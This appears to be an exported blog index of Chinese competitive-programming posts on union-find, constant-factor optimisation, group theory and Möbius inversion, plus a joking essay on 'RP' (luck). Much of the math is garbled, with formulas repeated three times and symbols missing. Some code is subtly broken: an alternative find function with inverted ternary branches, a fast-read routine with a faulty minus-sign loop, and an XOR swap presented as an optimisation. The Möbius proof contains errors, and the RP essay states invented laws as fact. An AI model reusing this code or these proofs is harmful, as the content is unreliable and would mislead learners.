    <content type="text"><![CDATA[并查集（Union-find Sets）是一种非常精巧而实用的数据结构，它主要用于处理一些不相交集合的合并问题.一些常见的用途有求连通子图、求最小生成树的 Kruskal 算法和求最近公共祖先（Least Common Ancestors, LCA）等使用并查集时，首先会存在一组不相交的动态集合 ，一般都会使用一个整数表示集合中的一个元素每个集合可能包含一个或多个元素，并选出集合中的某个元素作为代表 (不是三个) 每个集合中具体包含了哪些元素是不关心的，具体选择哪个元素作为代表一般也是不关心的。我们关心的是，对于给定的元素，可以很快的找到这个元素所在的集合（的三个代表），以及合并两个元素所在的集合，而且这些操作的时间复杂度都是常数级的并查集存储这里就用数组来存了2331int fa[MAXN]基本操作并查集的基本操作有三个：初始化fafafaGetGetGet操作MergeMergeMerge操作初始化并查集的初始化时间复杂度是O(n)O(n)O(n)的Code:1for (int i = 0; i &lt;= size; i++) fa[i] = i;GetGetGet操作设xxx为树根，那么xxx就为集合的代表, 否则递归访问fa[x]fa[x]fa[x]到根节点Code:12345678910int get (int x) &#123; if (x == fa[x]) return x; return fa[x] = get(fa[x]); // 路径压缩， fa直接复制为代表元素&#125;// 或者，你可以换种更加毒瘤的方式：int get (int x) &#123; return x == fa[x] ? fa[x] = get(fa[x]) : x;&#125;MergeMergeMerge 操作Code:123void Merge (int x, int y) &#123; fa[get(x)] = get(y);&#125;按秩合并这里也可以应用一个简单的启发式策略——按秩合并。该方法使用秩来表示树高度的上界，在合并时，总是将具有较小秩的树根指向具有较大秩的树根。简单的说，就是总是将比较矮的树作为子树，添加到较高的树中。为了保存秩，需要额外使用一个与 uset 同长度的数组，并将所有元素都初始化为 0代码就不贴了，自己想想就行了，这里我们使用路径压缩的并查集就行了先写到这吧Shq′sBlog\mathfrak {Shq&#x27;s \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>算法</tag>
        <tag>优化</tag>
        <tag>图论</tag>
        <tag>并查集</tag>
        <tag>路径压缩</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「玄学」常数优化的一些技巧]]></title>
    <url>%2Farticles%2Fduliu%2F</url>
    <content type="text"><![CDATA[本文来讲一讲一些算法竞赛中的常用优化优化在比赛中往往是十分有用的，他可能使你打的爆搜再过几个点，可能使你的朴素算法再A一题(我就用一些玄学优化过了洛谷上的一些优化题读入优化读入优化是优化最重要的一条，所已就将他手动置顶了代码:12345678910111213inline int SlowRead()&#123; int data = 0, w = 1; char ch = getchar(); while ((ch &gt; '9' || ch &lt; '0') &amp;&amp; ch == '-') &#123; w = -1; ch = getchar(); &#125; while (ch &lt;= '9' &amp;&amp; ch &gt;= '0') &#123; data = data * 10 + ch - '0'; ch = getchar(); &#125; return data * w;&#125;inline的使用可以 看到，我们再使用快读(SlowRead??)的时候，void前面加入了inline这个神奇的东西而inline有什么用呢，这就超过本文的范围了（才不是Shq懒在声明函数之前写上inline，可以加快一下函数调用但只能用于一些操作简单、调用频繁的函数。涉及递归，大号的循环等很复杂的函数，编译器会自动忽略inline。（我不知道强制inline有没有用）1234567891011121314inline void spaw (int &amp;a, int &amp;b) &#123; a ^= b ^= a ^= b;&#125; // 这是一个交换两数位置的程序，明显是可以优化我们的程序的inline void dfs (int x, int y) &#123; field[x][y] = '.'; for(int dx = -1; dx &lt;= 1; dx++) &#123; for(int dy = -1; dy &lt;= 1; dy++) &#123; int nx = x + dx,ny = y + dy; if( 0 &lt;= nx &amp;&amp; nx &lt;=N &amp;&amp; 0 &lt;=ny &amp;&amp; ny &lt;=M &amp;&amp; field[nx][ny] == 'w') dfs(nx, ny); &#125; &#125; return;&#125; // 这是一个十分复杂(复杂?)的dfs,明显，这时inline就失去了作用register在定义变量前写上register，用于把变量放到CPU寄存器中，适用于一些使用频繁的变量（比如循环变量），但寄存器空间有限，如果放得变量太多，多余变量就会被放到一般内存中快到什么境界？123456789const int MAX_I = 999999999;// 优化后register int a = 0;for(register int i = 1; i &lt;= MAX_I; ++i) ++a;// 优化前int b = 0;for(int i = 1; i &lt;= MAX_I; ++i) ++b;优化后：0.2826sec0.2826 sec0.2826sec优化前：1.944sec1.944sec1.944sec循环展开循环展开也许只是表面，在缓存和寄存器允许的情况下一条语句内大量的展开运算会刺激 CPU 并发(前提是你的 CPU 不是某 CPU)...减少了不直接有助于程序结果的操作的数量，例如循环索引计算和分支条件。提供了一些方法，可以进一步变化代码，减少整个计算中关键路径上的操作数量。用法（下面是一个将一个int 类型数组初始化为0的代码段）：12345void Init_Array(int *dest, int n) &#123; int i; for(i = 0; i &lt; n; i++) dest[i] = 0;&#125;循环展开优化：123456789101112void Init_Array(int *dest, int n) &#123; int i; int limit = n - 4; for(i = 0; i &lt; limit; i+= 5) &#123; dest[i] = 0; dest[i + 1] = 0; dest[i + 2] = 0; dest[i + 3] = 0; dest[i + 4] = 0; &#125; for(; i &lt; n; i++) dest[i] = 0;&#125;前置++后置 ++ 需要保存临时变量以返回之前的值，在 STL 中非常慢。事实上，int 的后置 ++ 在实测中也比前置 ++ 慢 0.5 倍左右注意： 这是Shq用C语言测试的，听说现在C++差不多一样快了？]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>乱搞</tag>
        <tag>玄学</tag>
        <tag>常数优化</tag>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数学」群论笔记]]></title>
    <url>%2Farticles%2Fgroup-theory%2F</url>
    <content type="text"><![CDATA[如果从公式化地来说，群是一个定义在二元组的代数结构SSS是一个集合，是一个二元运算符,并不是指乘号,比如平常我们在数集上所使用的,集合运算中使用的∪∩\cup \cap∪∩都是二元运算 满足下列条件的二元组可以称为群封闭性通俗来讲，就是集合SSS中任取两个元素，它们运算后的结果也是SSS中的元素 比如SSS是二维向量集,是点积,显然这个二元组不是群，因为运算得到的元素不属于SSS结合律这个比较简单，不说了单位元例如 时,e=0e=0e=0 时,e=1e=1e=1 时,没有单位元 如果GGG是加法群时,GGG中的单位元换叫做“零元”，记为000逆元在这种情况下我们可以把yyy写成 例如 S=ZS=ZS=Z , 时,x−1=−xx^{-1}=-xx​−1​​=−x S=RS=RS=R , 时,x−1=1xx^{-1}=\frac 1 xx​−1​​=​x​​1​​,所以这个二元组不是群,因为000不是逆元显然,不是群，因为它们中并不是所有的元素都有逆元 在群中,每个元素都是有逆元的 其实还有左右逆元之分,但是在群中,左逆元==右逆元 证明: ,,,即aaa是xxx的左逆元 显然那么即aaa也是xxx的右逆元如果GGG是加法群时，aaa的逆元改叫做“负元”，并记为相关概念阶GGG中所含元素的个数,称为群GGG的阶,记为∣G∣\left|G\right|∣G∣,即SSS中所含元素的个数 因此GGG可以根据∣G∣|G|∣G∣是否为,分为有限群和无限群 实际上GGG中的元素也有阶的定义，此处作为了解在群GGG中,。如果有整数k，使ak=ea_k=ea​k​​=e，那么使这个等式成立的最小正整数kkk叫做aaa的阶，记为k=∣a∣k=|a|k=∣a∣ (aka_ka​k​​表示连续kkk个aaa进行GGG中规定的运算，不是传统意义上的kkk个aaa相乘) 如果这样的kkk不存在，则称aaa的阶是无限的，记为消去律其实早在小学我们就接触过一些b=c⇔a+b=a+cb=c\Leftrightarrow a+b=a+cb=c⇔a+b=a+c对于群中的消去律来说，它的定义是x=yx=yx=y与互为充分必要条件注意这里的x,y,ax,y,ax,y,a都是指的是群中的任意元素当SSS是有限集,在具有封闭性,结合律和单位元的二元组里,逆元存在消去律存在证明：先说简单的，逆元存在⇒⇒消去律存在只要在两边同时乘以a−1a^{-1}a​−1​​就可以了消去律存在⇒⇒逆元存在对于,建立一个新二元组根据封闭性而且由于不会存在类似这样的重复元素情况(因为消去律的存在保证这种情况下x=yx=yx=y,违背集合元素的不重复性)，所以 所以又因为 e∈Se \in Se∈S 所以所以 ttt就是aaa的逆元了置换群在说置换群之前，我们先来谈谈置换 个元素之间的一个置换为(1,2,3,...,na1,a2,a3,...,an)\begin{pmatrix}1,2,3,...,n \\a_1,a_2,a_3,...,a_n \end{pmatrix}(​1,2,3,...,n​a​1​​,a​2​​,a​3​​,...,a​n​​​​)表示111被a1a_1a​1​​取代,222被a2a_2a​2​​取代…nnn被ana_na​n​​取代,其中a1,a2,...,ana_1,a_2,...,a_na​1​​,a​2​​,...,a​n​​是[1,n][1,n][1,n]的一个排列 我们称其为一个nnn元置换 对于每一个置换，我们可以理解成由一个元素变成另一种元素，即对目标集[1,n][1,n][1,n]的一种重新排列,如果还是不理解,可以看下面这个例子(1,2,3,43,1,2,4)\begin{pmatrix}1,2,3,4 \\3,1,2,4 \end{pmatrix}(​1,2,3,4​3,1,2,4​​)在这个四元置换下 对序列1,2,3,41,2,3,41,2,3,4经过置换就成了3,1,2,43,1,2,43,1,2,4 对3,1,2,43,1,2,43,1,2,4再置换就成了2,3,1,42,3,1,42,3,1,4 容易发现置换中列的位置是可以改变的,也就是说(1,2,3,43,1,2,4)=(4,2,3,14,1,2,3)\begin{pmatrix}1,2,3,4 \\3,1,2,4 \end{pmatrix}= \begin{pmatrix}4,2,3,1 \\4,1,2,3\end{pmatrix}(​1,2,3,4​3,1,2,4​​)=(​4,2,3,1​4,1,2,3​​)当nnn相等时,置换是可以相互运算的,我们称之为置换的连接,下文中我们将两个置换a,ba,ba,b写成ababab的形式即是a,ba,ba,b的连接运算,运算规则如下(1,2,3,...,na1,a2,a3,...,an)(a1,a2,a3,...,anb1,b2,b3,...,bn)=(1,2,3,...,nb1,b2,b3,...,bn)\begin{pmatrix}1,2,3,...,n \\a_1,a_2,a_3,...,a_n \end{pmatrix} \begin{pmatrix}a_1,a_2,a_3,...,a_n \\b_1,b_2,b_3,...,b_n \end{pmatrix} =\begin{pmatrix}1,2,3,...,n \\b_1,b_2,b_3,...,b_n \end{pmatrix}(​1,2,3,...,n​a​1​​,a​2​​,a​3​​,...,a​n​​​​)(​a​1​​,a​2​​,a​3​​,...,a​n​​​b​1​​,b​2​​,b​3​​,...,b​n​​​​)=(​1,2,3,...,n​b​1​​,b​2​​,b​3​​,...,b​n​​​​)显然置换的连接满足结合律,但不满足交换律 记一个nnn阶循环为两个循环(a1a2a3..an),(b1b2b3..bm)(a_1a_2a_3..a_n),(b_1b_2b_3..b_m)(a​1​​a​2​​a​3​​..a​n​​),(b​1​​b​2​​b​3​​..b​m​​)不相交是指对于 来说,不存在 使得ai=bja_i=b_ja​i​​=b​j​​因此置换也可以写成若干个互不相交的循环的乘积例如上面举的这个例子,写成循环就是(1,2,3)(4)(1,2,3)(4)(1,2,3)(4)数学归纳法的证明如下:首先n=1n=1n=1时显然成立当时,我们可以想象成在原来的n−1n-1n−1阶不相交循环里新加入了一个点nnn,设变成了,这样[1,n][1,n][1,n]的排列aaa就缺少了aia_ia​i​​,所以,显然这样操作之后仍然满足“互不相交的循环”定义“n−n-n−循环节数”是奇数的置换为奇置换 “n−n-n−循环节数”是偶数的置换为偶置换或者我们可以认为变成单位置换需要奇数次对换的置换为奇置换 变成单位置换需要偶数次对换的置换为偶置换我们可以把每个循环看做是单位置换进行若干次对换得到的比如循环(a1a2..an)(a_1a_2..a_n)(a​1​​a​2​​..a​n​​)是单位置换依次进行对换(a1,a2),(a1,a3)..(a1,an)(a_1,a_2),(a_1,a_3)..(a_1,a_n)(a​1​​,a​2​​),(a​1​​,a​3​​)..(a​1​​,a​n​​)得到的（所以如果由(a1a2..an)(a_1a_2..a_n)(a​1​​a​2​​..a​n​​)变回单位置换，就是依次进行对换(an,a1)..(a3,a1)(a2,a1)(a_n,a_1)..(a_3,a_1)(a_2,a_1)(a​n​​,a​1​​)..(a​3​​,a​1​​)(a​2​​,a​1​​) 更进一步来说，每个置换都可以看做是单位置换进行若干次对换得到的 因此对于两个置换的连接，我们可以看做是这两个置换所包含的对换的连接，也就是说新置换进行“这两个置换对换次数之和”次对换一定能够变回单位置换，所以奇置换·奇置换=偶置换偶置换·偶置换=偶置换奇置换·偶置换=奇置换偶置换·奇置换=奇置换再谈谈我对置换群定义的理解 具体来说,置换群中的元素是一些置换,运算是置换的连接。比如对于一个4×44 \times 44×4的棋盘,我们可以对它上面的格子进行编号,那样它就可以抽象成一个[1,16][1,16][1,16]的集合 然后我们规定888种置换:不动,左转,右转,旋转,以及翻折后的这四种操作在这888种置换下,每个位置上的格子aia_ia​i​​都会变成另一个格子bib_ib​i​​ 任意两个置换进行运算都可以得到这四种置换中的一种(封闭性)置换又满足结合律各元素的映射是其自身的置换是单位元eee而且每种置换都存在逆元 所以它们就可以组成一个置换群了容易发现，把任意置换倒过来，各循环中元素不变，循环个数不变既(123...na1a2a3...an)\begin{pmatrix}1&amp;2&amp;3&amp;...&amp;n \\a_1&amp;a_2&amp;a_3&amp;...&amp;a_n \end{pmatrix}(​1​a​1​​​​​2​a​2​​​​​3​a​3​​​​​...​...​​​n​a​n​​​​)与(a1a2a3...an123...n)\begin{pmatrix}a_1&amp;a_2&amp;a_3&amp;...&amp;a_n \\1&amp;2&amp;3&amp;...&amp;n \end{pmatrix}(​a​1​​​1​​​a​2​​​2​​​a​3​​​3​​​...​...​​​a​n​​​n​​)写成循环形式后循环个数和各循环中元素不变，因为每个置换我们都可以看做若干个不相交的有向环，倒过来以后实际上就是把每个环中的边反向，所以环的个数和大小不变就先写到这里了Shq′sBlog\mathfrak {Shq's \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>群论</tag>
        <tag>抽象代数</tag>
        <tag>逆元</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数论」从数学的角度来看莫比乌斯反演]]></title>
    <url>%2Farticles%2FMobius1%2F</url>
    <content type="text"><![CDATA[定义f(n)f(n)f(n)和g(n)g(n)g(n)是定义在正整数几何上的两个函数，若f(n)=∑d∣ng(d)f\left( n\right) =\sum _{ d| n}g\left( d\right)f(n)=​d∣n​∑​​g(d)则：g(n)=∑d,nμ(d)f(nc)g \left ( n \right ) \; =\; \sum _ {d , n} \mu \left ( d \right) f \left ( \dfrac {n}{c} \right)g(n)=​d,n​∑​​μ(d)f(​c​​n​​)反之亦然其中:μ(d)={1,(−1)r,0,\mu \left( d\right) =\begin{cases}1,\\ \left( -1\right) ^{r},\\ 0, \end{cases}μ(d)=​⎩​⎪​⎨​⎪​⎧​​​1,​(−1)​r​​,​0,​​例如M(1)=1,M(2)=−1,M(3)=−1,M(4)=0,M(8)=0M(1) = 1 \;,\; M(2) = -1\;,\; M(3) = -1 \;,\; M(4) = 0\;,\;M(8) = 0M(1)=1,M(2)=−1,M(3)=−1,M(4)=0,M(8)=0先证一个辅助定理辅助定理若若证明 当n=1n = 1n=1 时辅助定理显然成立若a0&gt;1,i=1,2,…ka_0 &gt; 1 \;\;, \;\;i = 1,2, \ldots ka​0​​&gt;1,i=1,2,…k其中pip_ip​i​​是互不相同的素数， i=1,2,…ki = 1,2, \ldots ki=1,2,…k一切d∣nd|nd∣n都可以写成:d=p1δ1×p2δ2×p3δ3×…×pkδk,δi≥0,i=1,2,3,…kd \;=\; p ^ {\delta _ {1}} _ 1 \times p ^ {\delta _ {2}} _ 2 \times p ^ {\delta _ {3}} _ 3 \times \ldots \times p ^ {\delta _ { k}} _ k\;,\; \delta _ {i} \geq 0\;,\; i\;=\;1,2,3,\ldots kd=p​1​δ​1​​​​×p​2​δ​2​​​​×p​3​δ​3​​​​×…×p​k​δ​k​​​​,δ​i​​≥0,i=1,2,3,…k令n1=p1p2p3…pkn_1 = p_1p_2p_3\ldots p_kn​1​​=p​1​​p​2​​p​3​​…p​k​​由于对pap^ap​a​​有μ(Pa)=0\mu \left( P^{a}\right) =0μ(P​a​​)=0，若a&gt;1a &gt;1a&gt;1， 故∑d∣nμ(d)=∑d∣n1μ(d)\sum _{ d|n}\mu \left( d\right) = \sum _{ d|n_1}\mu \left( d\right)​d∣n​∑​​μ(d)=​d∣n​1​​​∑​​μ(d)d∣n1d|n_1d∣n​1​​的ddd有许多组合，即ddd取p1,p2,p3…pkp_1, p_2,p_3\ldots p_kp​1​​,p​2​​,p​3​​…p​k​​的所有组合，若是偶数的组合，μ(d)\mu (d)μ(d)无贡献故∑d∣niμ(d)=μ(1)+∑j=1k(jk)(−1)j=(1−1)j=0\sum _{ d| n_{i}}\mu \left( d\right) =\mu \left( 1\right) +\sum ^{k}_{j=1}\left( ^{k}_{j}\right) \left( -1\right) ^{j}=\left( 1-1\right) ^{j}=0​d∣n​i​​​∑​​μ(d)=μ(1)+​j=1​∑​k​​(​j​k​​)(−1)​j​​=(1−1)​j​​=0莫比乌斯反演证明根据f(n)f(n)f(n)的公式可以得出：f(dn)=∑d′∣n′dg(d′)f\left( \dfrac {d}{n}\right) =\sum _{ d&#x27;| n&#x27;d}g\left( d&#x27;\right)f(​n​​d​​)=​d​′​​∣n​′​​d​∑​​g(d​′​​)所以∑d∣nμ(d)f(dn)=∑d∣nμ(d)×∑d′∣n′d×∑d′∣n′dg(d′)\sum _{ d| n}\mu \left( d\right) f\left( \dfrac {d}{n}\right) = \sum _{ d| n}\mu \left( d\right) \times \sum _{ d&#x27;| n&#x27;d} \times \sum _{ d&#x27;| n&#x27;d}g\left( d&#x27;\right)​d∣n​∑​​μ(d)f(​n​​d​​)=​d∣n​∑​​μ(d)×​d​′​​∣n​′​​d​∑​​×​d​′​​∣n​′​​d​∑​​g(d​′​​)令d=dd′n1d = dd&#x27;n_1d=dd​′​​n​1​​, 因为$∑d′∣n′dμ(d)=0\sum _{ d&#x27;| n&#x27;d} \mu \left ( d\right )= 0∑​d​′​​∣n​′​​d​​μ(d)=0$故∑d∣nμ(d)∑d′∣n′dg(d′)=∑d′∣ng(d′)∑d′∣n′dμ(d)=d(n)\sum _{ d| n}\mu \left( d\right) \sum _{ d&#x27;| n&#x27;d}g\left( d&#x27;\right) = \sum _{ d&#x27;| n}g\left( d&#x27;\right)\sum _{ d&#x27;| n&#x27;d} \mu (d) = d(n)​d∣n​∑​​μ(d)​d​′​​∣n​′​​d​∑​​g(d​′​​)=​d​′​​∣n​∑​​g(d​′​​)​d​′​​∣n​′​​d​∑​​μ(d)=d(n)反过来也类似可以证明:g(n)∑d∣nμ(d)f(dn)g\left( n \right)\sum _{ d| n}\mu \left( d\right)f\left( \dfrac {d}{n}\right)g(n)​d∣n​∑​​μ(d)f(​n​​d​​)则f(n)=∑d∣ng(d)f\left( n\right) =\sum _{ d| n}g\left( d\right)f(n)=​d∣n​∑​​g(d)练习题化简求值求∑d∣n∣μ(d)∣\sum _{ d | n}\left| \mu \left( d\right) \right|​d∣n​∑​​∣μ(d)∣的柿(式)子的值证明请证明:∑d2∣nμ(d)=∣μ(n)∣\sum _{ d^{2}| n}\mu \left( d\right) =\left| \mu \left( n\right) \right|​d​2​​∣n​∑​​μ(d)=∣μ(n)∣柿子是成立的先写到这吧Shq′sBlog\mathfrak {Shq&#x27;s \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>莫比乌斯反演</tag>
        <tag>莫比乌斯</tag>
        <tag>证明</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「玄学」RP导论]]></title>
    <url>%2Farticles%2FRP-introduction%2F</url>
    <content type="text"><![CDATA[你的RP足够吗？看看RP导论，也许就可以解释你最近的各种霉运了（RP守恒嘛）序为什么要写RP导论 ​ 真的很早就了解到RP在信息学竞赛中举足轻重的作用了，加上前两天由于爆RP考试爆零，星际被虐，交OJ莫名其妙unAC……一切的一起，让我不得不把RP的理论系统篆写于书，以供参考，防止大家重蹈我的覆辙。 众所周知，在信息学竞赛中，除去算法数据结构使用，程序编写调试能力之外，排在第三的对比赛有至关重要作用的便是RP了，RP高的人即使不知道算法也能用随机，贪心，搜索等RP算法得到无比多的RP分数；相反，没RP的人，有时知道正确算法也写出了正确程序，也往往会因为缺少RP而无法得分。这样看来，系统研究RP的积累于损失，以及量化地分析它对比赛的结果的影响就显得十分重要了。 但是，目前国内外系统研究RP的论文和书籍都还很缺乏，也有很多优秀的oier认识到了RP的重要性，但又因种种原因没能从事RP方面的研究，导致很多OIer因为对RP不了解而出现发挥失常，与奖牌失之交臂，为了让这种悲剧不再发生，我们有必要仔细研究RP了。RP的定义与形成RP的概念与意义 RP是大家耳熟能详的一个词汇和概念，改革开放以来，随着市场经济的深入，竞争日益激烈，大家都在寻找在各自领域取胜的有效方法，人们考虑各种因素来提高自己成功的概率。江湖难测，谁是强者，谁争一统武林的资格！ 在这样的大背景下，便自然而然地产生了RP的概念，起初这个概念还是依附在其他因素上的一个附属品，但是当人们真正认识到它的影响时，才发现它是一个独立的体系。由于各地各文献内容对RP的定义都很模糊，也不够统一，因此笔者在此一学术的角度，客观的方式给出RP的严格定义： RP：在一定时间和空间范围内独立于可见因素之外以不确定方式左右客观事物变化方式甚至规律的无形物质 一直以来，大家觉得RP过于飘渺，不愿意研究它，这其实是由于没有真正意识到RP在客观世界物质变化规律中的重要意义，由于客观世界矛盾的普遍性存在，导致RP因素在事物发展变化的各个角落都发挥着不可忽略的决策性作用，一般来说，RP的意义主要有以下几点： 1. **对客观世界的平衡作用** 物质世界总是趋于平衡的，无论是能量|物质守衡定律，还是热力学第一，第二定律，都从侧面支持这一结论。但是在事物的各个方面个体之间不可能完全平衡，而又不一定能在不多的可见主观因素中使个体之间实现平衡（这正如 背包-----双塔问题不一定有解一样），但是只要有了RP，就能很方便地对客观世界进行微调，使世界不失和谐。 2. **对主观行为的威慑作用** 所谓善有善报，恶有恶报，但是很难说服一个即将做不厚道事情的人让他停止，因为我们不能具体说出他的不厚道行为到底为什么会对他自己也有害，但是现在有了最强有力的威慑武器：RP！当他做不厚道事情的时候，最需要考虑的不是别的，正是自己的RP银行。 3. **对主观行为的激励作用** 与第二条相类似，RP的存在可以很大程度上激励人做积累RP的厚道事情，这里不再赘述。RP的形成 总的来说，RP的形成是多方面因素综合形象后的结果。对于RP形成的决定性因素，学术界一直没有公认的理论，目前比较被人接受的说法是： RP的形成与平时做事的厚道程度的二次方根成正比，但是也有人质疑这种说法，原因是有时一个很厚道的人也会莫名其妙没RP，典型的案例是发生在中国四川一个学校的一个叫hj的人，平时很厚道，但是也遇到了没RP的情况，虽然这很罕见，但是不得不让人思考，因此，有学者认为：在一定时间和客观条件下，RP值与该人做事厚道程度之和的正弦函数有关，因此呈现出很让人费解的波动性图象，但是这种理论因为缺乏实验支持，目前还没有在学术界占领主导地位，但是笔者认为，这种理论应该更贴近RP形成机理的真实情况。（最新研究表明，波动正是RP趋于平衡的必然结果，由于一个人的RP太高的情况下，失去 RP相对容易，所以会从波峰逐渐跌入波谷，反之亦然）(补充:因为RP和现实中由于概率问题而得到(或损失)的利益相关,从而导致RP会趋于平衡,例如:《塞翁失马》,其中的"塞翁"就是因为利益和RP之间相关连,导致出现一福一祸的现象,简单说就是碰到好事情RP会下降,碰坏事情RP会上升) 另外，RP的形成是有阶段性的，也就是说，有时候RP的变化并不是立竿见影的，但是RP升降因素的积累是不会停止的，在某个时期可能表现地不明显，但是宏观上的RP积累是一定的，这也就形成了RP的波动性改变，所以大家在某个RP低迷的时期也不应该停止对RP的积累。（就像力改变的是加速度，而不会对当前的速度有立竿见影的影响，不过长期的影响是深远而持久的） 另外客观世界满足一个基本定律————RP守衡定律，即RP不会凭空创生，也不会凭空湮灭，只会从一个生物转移到另一个生物，或者由RP转换为现实中通过不确定因素获得的利益，RP转移包含以下两种方式：虐与被虐。泡mm与mm被泡。 // 捡到钱(但是没有还)和丢钱(但是没找回来) ​ 这两条都很好理解，比如，某人玩星际被别人虐了，或者不小心把钱丢了,那么他的RP会有上升的倾向，另外，抢别人mm的人的RP会异常迅速地下降，或者捡到别人的钱不还也会导致RP下降,所以大家一定要厚道。RP的影响与利弊RP的不利影响 对于RP不足带来的不利影响，想必读者已经有了不少体会了，为了系统介绍，这里将不利影响列举一些例子如下：考试爆0（考挂，发挥失常等）泡mm失败（被无视，被抢夺等）自行车胎被扎（汽车，电瓶车）物品频繁损坏（如T43等）炉石被虐（连续被虐很多局根据叠加原则将会出现更深远的影响）误机（堵车，迷路等） 以上每一条虽然是RP不足带来的不利影响，但是客观上又可以积累RP，这也正体现了客观世界与RP的辨证关系。 从宏观上讲，上述事情也许并非全是坏事，像（3），（4）两条在扩大内需，刺激经济增长方面也是有积极作用的，但是本文讨论的主观色彩较重，对一些过于YY的东西不做讨论。 关于RP带来的麻烦的解决方法，学术界一直争论不休，企图认为改变RP变化趋势的想法，已经被实践证明是NPC，想预测RP的发展方向，也被论证是不可解问题。 那么，面对RP带来的不利影响，我们真的就束手无策了 吗？非也！我们有解决NP类问题的有力武器：星际！！！！ 在RP不好的时候，开High—AI调两家神族，遭电脑虐几盘，RP指数相信会有很大概率要++的，虽然这仍然是个部分算法，但是事实证明是很有效的，已经不亚于CQF的（sei）机贪心了……(补充: 根据RP守恒定律中"只会从一个人身上转移到另一个人身上",此方法可能没有效果) 此外，另有极端人士为了平衡自己的RP，在关键时刻向别人赠送人民币，虽然被证明实际效果甚微，但是由于接受方会损失大量RP，所以这种行为也被认为是极度危险和边缘的。对于此损人不利己的行为，将会在以后对自己的RP走向产生不利影响。从自己和别人那里流失出来的RP，就会流入社会，等待下一次再分配（根据标量场理论，RP高者将在再分配中较低RP者得到更多的RP) 古时另有各种迷信活动来祈求获得RP，经证明一些行为是十分有效的，但是尚没有任何科学理论可以他们的成功，其中最著名的历史事件为诸葛亮借东风，这是以神秘的法事活动来获得RP成功的典型例子，不但说明了我国的RP研究在很早的时候就有开展，并且代表了当时的RP学说已经发展到相当先进的阶段，后来由于战乱和历史原因，RP学逐渐没落和淡出国人的视野，在近代才又被重新提出和加以研究，但想恢复当年的水平还任重而道远。RP的有利影响 对于希望利用RP以追求更高品质生活的读者来说，RP的有利影响也是应该了解的重要问题之一。关于RP的有利影响，对于大部分本人读者来说，不外乎下面两个方面：考试获得理想的分数泡mm获得阶段性成果 总结起来便是工作方面和生活方面，从中可以看出，RP对于生产生活的各个方面如果合理加以利用都可以达到相当大的有利效果。所以，“天下之大，RP 独尊”，若存在一种方式，可以让一个人长期保有相当量的RP，那么此人便可以独步天下，无人能当，足以可见RP的威力。（也有学者认为本情况是不可能成为现实的，不过并没有合理的证明）不过关于高RP独步天下的例子，笔者实在难以获得，这也从侧面反映了RP易失难获的性质，从而说明了大自然趋于平衡的典型特征。RP的估测与评价RP的单位系统 我们生活的环境是存在着RP场(本人认为，不同时间束分支所含主观RP不同，所以穿越会获得大量RP)，就象我们生活在磁场中一样。每个人都存在着一定的RP势能，记作ErpErpErp。它所遵循的定律见“RP的变化与操纵”。RP的本质是一种人为设想的能量形式，用来描述一个人的LUCKY值。RP的估测方法 Erp的变化量大小ΔErp=¬(abs(w−f)+1)/P\Delta Erp=\lnot (abs(w - f) + 1)/PΔErp=¬(abs(w−f)+1)/P（w表示期待事件发生的次数，如果不想它发生一次那么w=-1，f是事件的频率，P是事件的概率）​ 式中¬\lnot¬为RP方向符，表示RP转移的大致方向（流入，流出），正向有利事件为正，反向不利事件为负，其绝对值为111 此公式可用来计算瞬间转移的RP值，例如：一个人中了500W500W500W，中奖的概率是110000001 \over 1000000​1000000​​1​​，想这一次中奖，那么，Erp=1000000Erp=1000000Erp=1000000(zzz是他有多期待重500W500W500W），也就是说，他瞬间损失了这么多RP势能。如果你不去想，即w=0w=0w=0，那么将会损失更多RP（可以这么理解，你无所谓的事情都发生了，那你肯定要多损失点RP啦）。再例如：帮老奶奶过街，因为碰到这样的情况概率不大（也就是说机会难得啊，如果是一般的让座估计就没这么多RP赚了），所以得到的ErpErpErp也就大咯。 学说1：一个人的RP势能很低，并不代表RP能量就会向他流动，因为这些能量还受到周边人、物的RP引力制约。只能说，RP低的人在同等条件下更容易接受RP能量，从而升高RP势能；RP势能高容易失去RP（多数以无用的形式流向大自然，因为这是必然事件，那么），为了维持较高的RP势，我们就要不断的补充。但是RP势能高，并不代表就会有你说期待的好事发生，有可能这些RP以其他你所不期待的形式释放了，我们称作为RP亏损，这就取决于你的RP利用率了。所以，我们在汲取RP的同时，还要锻炼我们的RP利用率。 这里要说一个自然损失，因为这是必然时间，所以P=1P=1P=1，那么RP的损失量就直接和你的W值有关了，也就是，如果你正确认识了这种必然性，你的RP只会损失111，如果你非常不想让它损失那么你将损失更多的RP能量，所以，调整心态是很重要的啊～！ 学说2：RP不同于电荷，自由状况下RP元会产生由低RP向高处流动的灵异现象。举个例子说，一个封闭的外界RP场隔离大容器中有一个RP值为500L的物体和一个RP值为0.3L的物体，后者的RP会逐渐转向前者，直至后者RP低到一定程度。实验验证有如下关系：（元）（）总式中为决定于容器性质的数。RP的变化与操控RP的几大定律RP第一定律 RP是守恒的，它既不会凭空产生，也不会凭空消失 宇宙创生之初，与各大基本粒子同时由爆炸基点生成的一大暗物质种类就是RP。经过笔者的多年探究和无数实验，配合与史蒂芬·霍金的理论研究合作，已经基本从理论高度证明了RP第一定律，也称为"RP守恒定律"。 这一定理的理解往往不像物理学中的“热力学第一定律”那样好理解，因为在实际生产生活实践中，往往会发现某人的RP大量减少，但是并没有发现某人的 RP有明显的提升，所以也导致在很长一段时间内大量研究人员质疑RP守恒定律的正确性。进一步研究发现，RP的存在和守恒是确定的只是由于绝大多数RP往往存在于生物体之外而以“自由RP”的形式游离于宇宙空间，所以，以上那种情况仅仅表明某人的RP由于自身原因散佚于宇宙空间，却没有人从空间中汲取 RP,从而导致有效RP减少，也就是发挥作用的RP减少了，但并没有影响RP本身的守恒。 